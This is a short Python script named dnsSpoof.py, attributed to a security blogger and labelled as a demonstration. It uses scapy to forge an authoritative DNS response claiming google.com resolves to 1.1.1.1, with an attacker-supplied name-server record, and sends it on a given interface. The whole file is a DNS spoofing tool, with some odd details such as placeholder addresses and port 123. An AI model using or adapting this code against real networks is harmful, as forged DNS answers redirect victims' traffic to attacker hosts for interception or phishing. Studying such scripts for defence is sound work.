#!/usr/bin/env python
# This code is strictly for demonstration purposes.
# If used in any other way or for any other purposes. In no way am I responsible
# for your actions or any damage which may occur as a result of its usage
# dnsSpoof.py
# Author: Nik Alleyne - nikalleyne at gmail dot com
# http://securitynik.blogspot.com

from os import uname
from subprocess import call
from sys import argv, exit
from time import ctime, sleep
from scapy.all import *

spoofedIPPkt = IP(src='1.2.3.4',dst='1.2.3.4')           
spoofedUDP_TCPPacket = UDP(sport=53,dport=123)
spoofedDNSPakcet = DNS(id=1,qr=1,opcode=1,aa=1,rd=0,ra=0,z=0,rcode=0,qdcount=1,ancount=1,nscount=1,arcount=1,qd=DNSQR(qname="google.com",qtype=1,qclass=1),an=DNSRR(rrname="google.com",rdata='1.1.1.1',ttl=86400),ns=DNSRR(rrname="google.com",type=2,ttl=86400,rdata=argv[2]),ar=DNSRR(rrname="google.com",rdata='1.1.1.1'))                       
pckToSend = Ether()/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPakcet
sendp(pckToSend,iface=argv[1].strip(), count=1)

